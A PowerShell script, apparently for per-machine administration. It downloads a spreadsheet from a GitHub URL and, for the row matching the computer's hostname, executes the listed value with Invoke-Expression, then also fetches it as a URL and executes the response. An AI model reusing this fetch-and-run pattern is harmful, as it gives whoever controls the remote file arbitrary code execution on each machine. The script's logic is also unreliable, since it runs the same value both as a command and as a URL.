# Get the current computer name
$computerName = (hostname)

# URL of the Excel spreadsheet (Raw link from GitHub)
$excelURL = "https://github.com/MikesTooLz/7371/raw/main/PC-List.xlsx"

# Path to temporarily save the downloaded file
$tempFilePath = "$env:TEMP\tempfile.xlsx"

# Download the Excel file from the web URL
Invoke-WebRequest -Uri $excelURL -OutFile $tempFilePath

# Create an instance of Excel COM object
$excel = New-Object -ComObject Excel.Application

# Make Excel visible (optional)
$excel.Visible = $false

# Open the Excel file
$workbook = $excel.Workbooks.Open($tempFilePath)

# Select the first worksheet
$worksheet = $workbook.Worksheets.Item(1)

# Get the range of used cells
$usedRange = $worksheet.UsedRange

# Get the number of rows in the used range
$rowCount = $usedRange.Rows.Count

# Iterate through each row in the spreadsheet
for ($i = 1; $i -le $rowCount; $i++) {
    # Get the value of the "PC" and "Script" columns in the current row
    $pcName = $worksheet.Cells.Item($i, 1).Value2
    $script = $worksheet.Cells.Item($i, 2).Value2
    

    # Check if the current computer name matches the one in the "PC" column
    if ($computerName -eq $pcName) {
        Write-Host "Executing script for $pcName"
        # Execute the script listed in the "Script" column
        Invoke-Expression $script
        $response = Invoke-WebRequest -Uri $script
        Invoke-Expression -Command $response.Content

    }
}

# Close the workbook
$workbook.Close()

# Close Excel
$excel.Quit()

# Clean up COM objects
[System.Runtime.Interopservices.Marshal]::ReleaseComObject($worksheet) | Out-Null
[System.Runtime.Interopservices.Marshal]::ReleaseComObject($workbook) | Out-Null
[System.Runtime.Interopservices.Marshal]::ReleaseComObject($excel) | Out-Null
Remove-Item $tempFilePath
